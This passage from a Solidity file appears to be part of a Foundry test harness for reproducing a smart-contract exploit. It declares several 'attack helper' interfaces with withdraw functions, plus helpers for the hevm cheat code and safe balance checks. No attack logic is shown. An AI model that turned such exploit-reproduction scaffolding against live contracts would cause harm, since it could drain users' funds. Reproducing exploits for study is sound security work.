    function withdraw(address) external;
}

interface Iattack_helper_73DD {
    function withdraw(address) external;
}

interface Iattack_helper_9493 {
    function withdraw(address) external;
}

interface Iattack_helper_9D95 {
    function withdraw(address) external;
}

interface Iattack_helper_DEA3 {
    function withdraw(address) external;
}

library Harness {
    function vmExt() internal pure returns (VmExt) {
        return VmExt(address(uint160(uint256(keccak256("hevm cheat code")))));
    }

    function safeBalance(address token, address account) internal view returns (uint256) {
        if (token.code.length == 0) return 0;
        (bool ok, bytes memory data) = token.staticcall(abi.encodeWithSignature("balanceOf(address)", account));
        if (!ok || data.length < 32) return 0;
        return abi.decode(data, (uint256));
    }
}
